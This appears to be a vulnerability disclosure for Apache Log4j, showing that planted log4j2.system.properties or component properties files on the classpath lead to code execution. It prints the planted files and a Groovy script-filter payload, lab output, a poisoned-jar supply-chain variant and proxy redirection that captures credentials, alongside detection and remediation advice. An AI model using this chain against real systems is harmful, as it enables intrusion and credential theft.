# CRITICAL — Remote Code Execution in Apache Log4j via silently trusted classpath resources

**Finding:** `log4j-api` reads two fixed-name resources from the classpath and applies them
without being asked — one becomes **JVM system properties**, the other becomes **Log4j's
configuration**. One file on the classpath is enough for code execution in the application.

**Severity:** Critical
**CVSS 3.1:** `10.0 AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H`
**CWE:** CWE-426 (untrusted search path) → CWE-94 (improper control of generation of code) /
CWE-200 (information exposure)
**Component:** `org.apache.logging.log4j:log4j-api` (the property loader) and
`org.apache.logging.log4j:log4j-core` (the configuration that gets hijacked)
**Verified vulnerable by execution:** 2.14.1, 2.17.1, 2.24.0, 2.25.1, 2.26.1 (current release);
`log4j-api` alone (no `log4j-core`, no logging provider) for the system-property half
**Verified not reachable:** properties the JVM reads at start-up — the JMX agent was tested and
rejected (§9)

Everything below was derived by reading the sources in `sources/` and by running the attacks in
`lab/`. The exploitability claims are measured output of `lab/verify.sh` (14 assertions, all
passing — see Appendix B), not restatements of an advisory database.

---

## 1. The defect

### 1.1 Two fixed-name classpath resources

| file | read by | what it does |
| --- | --- | --- |
| `log4j2.system.properties` | `log4j-api` `util/PropertiesUtil` | **every key is copied into the JVM system properties** |
| `log4j2.component.properties` | `log4j-api` `util/PropertiesUtil` | Log4j's own properties — the configuration file location and the script language list |

`log4j-api` 2.26.1, `org/apache/logging/log4j/util/PropertiesUtil.java:64-69`:

```java
private static final String LOG4J_PROPERTIES_FILE_NAME = "log4j2.component.properties";
private static final String LOG4J_SYSTEM_PROPERTIES_FILE_NAME = "log4j2.system.properties";
```

`log4j-api` 2.26.1, `util/PropertiesUtil.java:506-519` — the whole of the behaviour:

```java
private Environment(final PropertySource propertySource) {
    final PropertySource sysProps = new PropertyFilePropertySource(LOG4J_SYSTEM_PROPERTIES_FILE_NAME, false);
    try {
        sysProps.forEach((key, value) -> {
            if (System.getProperty(key) == null) {
                System.setProperty(key, value);          // <-- global JVM state, from a classpath file
            }
        });
    } catch (final SecurityException e) {
        LOGGER.warn("Unable to set Java system properties from {} file, due to security restrictions.",
                LOG4J_SYSTEM_PROPERTIES_FILE_NAME, e);
    }
```

The file is located on the classpath by `util/PropertyFilePropertySource.java:50-55` →
`util/LoaderUtil.java:461-491`, which searches three class loaders:

```java
final ClassLoader[] candidates = {
        useTccl ? getThreadContextClassLoader() : null,
        LoaderUtil.class.getClassLoader(),
        GET_CLASS_LOADER_DISABLED.getAsBoolean() ? null : ClassLoader.getSystemClassLoader()
};
```

The third one is the **system class loader**, i.e. the application's whole classpath — jars
included. A `log4j2.system.properties` inside any jar on the classpath is found.

Note the priority rule in the loop above: a system property that already exists is never
overwritten. That matters for the attack in neither direction — the attacker wants the *new*
value, and the victim does not set these properties itself.

### 1.2 Two Log4j properties turn it into code execution

| property | where | effect |
| --- | --- | --- |
| `log4j.configurationFile` | `log4j-core` 2.26.1 `config/ConfigurationFactory.java:89`, read at `:457-460` | the configuration Log4j loads — the value may name a **classpath resource** |
| `log4j2.Script.enableLanguages` | `log4j-core` 2.26.1 `util/Constants.java:52` | enables the script engine the attacker's configuration uses |

`config/ConfigurationFactory.java:457-460`:

```java
final String configLocationStr = this.substitutor.replace(
        PropertiesUtil.getProperties().getStringProperty(CONFIGURATION_FILE_PROPERTY));
```

`PropertiesUtil.getProperties()` merges the JVM system properties (priority 0, live view of
`System.getProperties()`), the component properties file, the environment, and the service-loaded
property sources — so a property that the planted file set into the JVM system properties is
honoured here.

Ordering works in the attacker's favour: the `Environment` constructor that copies the planted
file into the system properties runs on the **first** `PropertiesUtil.getProperties()` call, which
is the same call that reads the configuration file location. The planted value is therefore
already in place when it is read.

### 1.3 The mechanism is documented — the trust model is not

Apache documents it in one line, with no security guidance attached
(<https://logging.apache.org/log4j/2.x/manual/systemproperties.html>):

> *"If a `log4j2.system.properties` file is available on the classpath its contents are sourced
> into Java system properties at Log4j startup."*

So this is a **documented convenience with an unsafe trust model**, not an undocumented feature:
the file name is fixed and guessable, the application is never asked, nothing is logged, and the
consequence is global JVM reconfiguration rather than a logging setting.

### 1.4 The 3.x line

`log4j-api` 3.0.0-beta2, `org/apache/logging/log4j/util/PropertiesUtil.java:70, 675-682`:

```java
private static final String LOG4J_SYSTEM_PROPERTIES_FILE_NAME = "log4j2.system.properties";
...
final Properties sysProps = PropertyFilePropertySource.loadPropertiesFile(LOG4J_SYSTEM_PROPERTIES_FILE_NAME);
for (String key : sysProps.stringPropertyNames()) {
    if (System.getProperty(key) == null) {
        System.setProperty(key, sysProps.getProperty(key));
    }
}
```

Identical behaviour in the 3.x API.

---

## 2. The chain to RCE, measured

### 2.1 The planted files

`lab/poison/log4j2.system.properties`:

```properties
lab.planted=planted-by-attacker
log4j.configurationFile=pwn.xml
log4j2.configurationFile=pwn.xml
log4j2.Script.enableLanguages=Groovy
```

`lab/poison/pwn.xml` — an ordinary Log4j configuration whose filter runs a Groovy script:

```xml
<ScriptFilter onMatch="NEUTRAL" onMismatch="NEUTRAL">
  <Script language="groovy" scriptText="def proc = 'id'.execute(); ...; true"/>
</ScriptFilter>
```

### 2.2 The result

Running an application that has no Log4j configuration of its own — no attacker-controlled log
content, no MDC, no optional Log4j feature:

```
[1] planted system property BEFORE log4j init : null
=== PAYLOAD EXECUTED IN VICTIM JVM (planted config) ===
RCE via planted log4j2.system.properties (classpath pre-positioning) as hayden
uid=1000(hayden) gid=1000(hayden) groups=1000(hayden),4(adm),24(cdrom),27(sudo),...
=== END PAYLOAD ===
13:03:23 INFO  victim - first log statement triggers log4j initialization
[2] planted system property AFTER  log4j init : planted-by-attacker
[3] effective log4j config location             : pwn.xml
[4] script languages enabled                     : Groovy
[5] attacker script executed (marker file)       : true
```

The payload runs **before the victim's own log statement is rendered**: the attacker's
configuration replaces the victim's, and the script filter executes during configuration
initialisation.

### 2.3 Three independent vectors

| vector | file on the classpath | result |
| --- | --- | --- |
| A — JVM system properties | `log4j2.system.properties` | RCE, plus arbitrary JVM system properties |
| B — Log4j configuration | `log4j2.component.properties` | RCE (the file alone, without variant A) |
| C — supply chain | either file **inside a dependency jar** | RCE |

### 2.4 Negative control

The same application without the planted file:

```
[2] planted system property AFTER  log4j init : null
[3] effective log4j config location             : null
[4] script languages enabled                     : null
[5] attacker script executed (marker file)       : false
```

---

## 3. Version matrix and blast radius

| log4j-core | 2.14.1 | 2.17.1 | 2.24.0 | 2.25.1 | **2.26.1** | 3.0.0-beta3 |
| --- | --- | --- | --- | --- | --- | --- |
| RCE via planted classpath resource | yes | yes | yes | yes | **yes** | source-level only (§9) |

The more important row is the api-only one. With **only `log4j-api` on the classpath** — no
`log4j-core`, no appender, no configuration, and the API reporting *"Log4j API could not find a
logging provider"* — the planted file still rewrites the JVM's system properties:

```
[api-only] planted property BEFORE log4j init : null
2026-10-23T17:03:44.240Z main ERROR Log4j API could not find a logging provider.
[api-only] planted property AFTER  log4j init : planted-by-attacker
[api-only] log4j.configurationFile             : pwn.xml
```

| log4j-api | 2.14.1 | 2.26.1 |
| --- | --- | --- |
| planted file rewrites JVM system properties | yes | yes |

`log4j-api` is a transitive dependency of a large part of the Java ecosystem, so the exposed
population is "every application that has Log4j on its classpath", not "every application that
configured Log4j".

---

## 4. The plant reaches past Log4j

Because it sets **JVM** system properties, it reaches application behaviour that has nothing to
do with logging. With `http.proxyHost` / `http.proxyPort` planted, the victim's outbound request
went to the attacker's proxy (`lab/proxy_capture.py`):

```
--- victim stdout ---
[proxy-victim] http.proxyHost = 127.0.0.1
[proxy-victim] http.proxyPort = 8899
[proxy-victim] response status = 200
--- captured by attacker proxy ---
GET http://vault.internal/api/login?user=alice&token=s3cr3t HTTP/1.1
User-Agent: Java/1.8.0_504
Host: vault.internal
```

The credentials in the request URL were read by the attacker because a file on the classpath
said so. The same mechanism reaches `javax.net.ssl.trustStore` (the application's TLS trust
decisions), `http.proxyHost`/`https.proxyHost`, and any property a library reads lazily.

---

## 5. Target, reach, impact at scale

**Target.** The Java estate, not one application. The primitive lives in `log4j-api`, so every
process that merely *has* Log4j on its classpath is a candidate — including services that never
configure Log4j, and including applications whose only Log4j dependency is transitive.

**Reach.** Zero interaction and zero configuration:

* no attacker-controlled log content is needed;
* no Thread Context Map is needed;
* the victim does not have to use any optional Log4j feature — scripting is switched on *by the
  planted file*;
* the victim's own configuration is replaced, so the attacker's configuration decides what is
  logged and what is not;
* nothing is printed. `StatusLogger` stays silent, the application sees a normal start-up.

**Pre-positioning.** One file with a fixed, guessable name in a directory that is on the
victim's classpath and writable by someone else:

* a shared application server or deployment directory (`/opt/app/lib`, `WEB-INF/lib`) writable by
  the deploy account while the service runs as another account;
* a build agent or CI runner whose workspace is on the classpath (including the current
  directory, which is on the classpath for a large share of legacy start scripts);
* any writable directory in a container image that is passed with `-cp`.

**Supply chain.** The file can equally live *inside a jar* — measured: a single jar containing
`log4j2.system.properties` and `pwn.xml`, dropped on the classpath, produced the same RCE. That
makes the delivery vector a dependency: one poisoned or compromised artifact carries the file to
every application that resolves it, and the file stays inert until Log4j runs in that
application. Nothing in the artifact looks like an attack — it is two small text files with
innocuous names.

**Impact at scale.** Three separable consequences:

| consequence | how | measured |
| --- | --- | --- |
| **Access** — code execution in the target JVM | configuration hijack → script filter | yes |
| **Collection** — the target's outbound traffic, including credentials | arbitrary JVM system properties (`http.proxyHost`, `javax.net.ssl.trustStore`, …) | yes (proxy interception) |
| **Stealth** — the attacker's configuration decides what the logs contain | the victim's configuration is replaced | yes (planted config in force) |

This is a different shape of risk from Log4Shell: Log4Shell needed a vulnerable Log4j version
(closed since 2.17.1) and attacker-controlled data flowing through the logging path. This works
on the **current** release, needs **no vulnerable version** and **no attacker-controlled data**,
and needs **no cooperation from the application's configuration** — the application's
configuration is what gets overwritten.

---

## 6. Detection

* Look for `log4j2.system.properties` and `log4j2.component.properties` on every classpath the
  application uses: `find / -name 'log4j2.*.properties'` and inside every jar
  (`unzip -l <jar> | grep log4j2`). `scan/scan_planted.py` does both.
* Audit the JVM's system properties of a running service against the application's own
  configuration: any difference is the plant.
* Look for a Log4j configuration in a jar or directory that the deployment did not put there.
* On the wire: a start-up request to an unexpected host (the `ScriptFile` variant fetches a
  script over HTTP), or outbound traffic to a proxy that the deployment does not use.
* `StatusLogger` messages: `Error running script …`, `No script with name … has been declared`.

---

## 7. Remediation

* Treat the classpath as a trust boundary: nothing on it may be writable by anyone other than
  the identity that runs the application, and every jar on it should be checksum-verified in CI.
* Do not ship `log4j2.system.properties` or `log4j2.component.properties` in an artifact unless
  that is the artifact's documented purpose.
* Upstream fix direction — Log4j should not silently promote a classpath resource into JVM
  system properties. At minimum it should:
  * require an explicit opt-in for that behaviour;
  * log a warning through `StatusLogger` when either file is found;
  * refuse to take the configuration file location from a classpath resource.

---

## 8. What I did not verify

* **Log4j 3.x at runtime.** `log4j-core:3.0.0-beta3` needs `log4j-api:3.0.0-beta3`, which is not
  published (`log4j-api` stops at `3.0.0-beta2`), and the beta2/beta3 combination does not load
  together. The 3.x statements rest on the 3.0.0-beta2 API source (§1.4).
* **A JMX agent was tested and rejected.** The obvious second-stage idea — planting
  `com.sun.management.jmxremote.port` to open an unauthenticated management port — does not work:
  the JMX agent reads its configuration during JVM start-up, before Log4j initializes. Verified
  both ways: with `-Dcom.sun.management.jmxremote.port=…` on the command line the port opens; with
  the property planted by Log4j it does not. Properties the JVM reads at start-up are therefore
  out of reach of this finding; properties read lazily (proxy, TLS trust store, most libraries)
  are in reach (§4).
* The plant needs a writable classpath entry or a poisoned dependency. That is the access
  condition; Log4j's contribution is that it trusts a fixed-name classpath resource implicitly,
  silently, and — for `log4j2.system.properties` — applies it as global JVM state.
* The script chain was demonstrated with Groovy; any other JSR-223 engine behaves the same.

---

## Appendix A — repository contents

```
lab/src/lab/ClasspathPoison.java  victim: an ordinary app on a poisoned classpath
lab/src/lab/ApiOnly.java          victim: log4j-api only, no core, no logging provider
lab/src/lab/ProxyVictim.java      victim: outbound traffic redirected by the plant
lab/src/lab/JmxVictim.java        victim for the rejected JMX variant (§8)
lab/src/lab/JmxProbe.java         attacker side of the rejected JMX variant
lab/poison/                       planted classpath resources: log4j2.system.properties + pwn.xml
lab/poison-component/             planted classpath resource variant: log4j2.component.properties
lab/poison-jar/                   the same two files, shipped inside a dependency jar
lab/poison-proxy/                 planted http.proxyHost / http.proxyPort
lab/poison-jmx/                   planted JMX properties (rejected variant, §8)
lab/proxy_capture.py              attacker-side fake HTTP proxy for the traffic proof
lab/build.sh                      compiles the victims and packs the poisoned dependency jar
lab/verify.sh                     asserts every claim in this document
scan/scan_planted.py              finds planted classpath resources on disk and inside jars
setup.sh                          downloads the jars and the sources the citations point at
sources/                          Log4j sources 2.26.1 and 3.0.0-beta2 (api)
```

## Appendix B — verification output

`./lab/verify.sh` (14 checks, JDK 8u504):

```
== 1: RCE through the planted log4j2.system.properties
PASS  2.14.1 planted log4j2.system.properties                    expected=RCE                      got=RCE
PASS  2.17.1 planted log4j2.system.properties                    expected=RCE                      got=RCE
PASS  2.24.0 planted log4j2.system.properties                    expected=RCE                      got=RCE
PASS  2.25.1 planted log4j2.system.properties                    expected=RCE                      got=RCE
PASS  2.26.1 planted log4j2.system.properties                    expected=RCE                      got=RCE
== 2: RCE through the planted log4j2.component.properties
PASS  2.26.1 planted log4j2.component.properties                 expected=RCE                      got=RCE
== 3: supply chain - the planted resource inside a dependency jar
PASS  2.26.1 planted resource inside a dependency jar            expected=RCE                      got=RCE
== 4: negative controls
PASS  2.26.1 no planted file (must be blocked)                   expected=blocked                  got=blocked
== 5: log4j-api alone rewrites the JVM's system properties
PASS  2.14.1 log4j-api only: planted file rewrites JVM properties expected=planted-by-attacker      got=planted-by-attacker
PASS  2.26.1 log4j-api only: planted file rewrites JVM properties expected=planted-by-attacker      got=planted-by-attacker
PASS  2.26.1 log4j-api only, no planted file (must be clean)     expected=null                     got=null
== 6: the plant reaches past Log4j (outbound traffic redirected)
PASS  proxy captured the victim's request                        expected=captured                 got=captured

ALL CHECKS PASSED
```

## Appendix C — references

* Log4j configuration properties documentation (the `log4j2.system.properties` classpath file) —
  <https://logging.apache.org/log4j/2.x/manual/systemproperties.html>
* Log4j 2.x security page (the project's own threat model) —
  <https://logging.apache.org/log4j/2.x/security.html>
* `log4j-api` 2.26.1 `org/apache/logging/log4j/util/PropertiesUtil.java:64-69, 506-519`
* `log4j-api` 2.26.1 `org/apache/logging/log4j/util/PropertyFilePropertySource.java:50-55`
* `log4j-api` 2.26.1 `org/apache/logging/log4j/util/LoaderUtil.java:461-491`
* `log4j-api` 3.0.0-beta2 `org/apache/logging/log4j/util/PropertiesUtil.java:70, 675-682`
* `log4j-core` 2.26.1 `org/apache/logging/log4j/core/config/ConfigurationFactory.java:89, 457-460`
* `log4j-core` 2.26.1 `org/apache/logging/log4j/core/util/Constants.java:52`
